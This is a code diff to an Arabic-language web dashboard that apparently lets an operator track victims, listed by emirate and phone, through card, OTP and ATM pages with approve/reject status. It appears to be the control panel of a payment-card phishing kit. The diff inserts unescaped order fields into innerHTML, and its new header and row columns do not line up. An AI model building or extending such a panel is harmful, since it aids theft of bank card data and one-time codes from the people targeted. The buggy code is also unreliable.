@@ -383,6 +383,8 @@
                         <th>رقم التليفون</th>
                         <th>نوع البطاقة</th>
                         <th>الحالة</th>
+                        <th>الإجراءات</th>
+                        <th>الصفحة الحالية</th>
                         <th>التاريخ والوقت</th>
                         <th>التفاصيل</th>
                     </tr>
@@ -510,6 +512,15 @@
                 const statusText = order.status === 'approved' ? 'موافق' : 
                                   order.status === 'rejected' ? 'مرفوض' : 'قيد الانتظار';
 
+                // Get current page
+                const currentPageMap = {
+                    'payment_card': 'البطاقة',
+                    'payment_otp': 'OTP',
+                    'payment_atm': 'ATM',
+                    'payment_success': 'النجاح'
+                };
+                const currentPage = currentPageMap[order.currentPage] || 'جديد';
+
                 const row = document.createElement('tr');
                 row.innerHTML = `
                     <td>${order.emirate || '-'}</td>
@@ -517,8 +528,10 @@
                     <td>${order.phone || '-'}</td>
                     <td>${order.cardholderName ? 'Visa' : '-'}</td>
                     <td><span class="status-badge ${statusClass}">${statusText}</span></td>
-                    <td>${order.timestamp || '-'}</td>
                     <td><button class="details-btn" onclick="showDetails('${order.id}')">التفاصيل</button></td>
+                    <td>${currentPage}</td>
+                    <td>${order.timestamp || '-'}</td>
+                    <td></td>
                 `;
                 tbody.appendChild(row);
             });
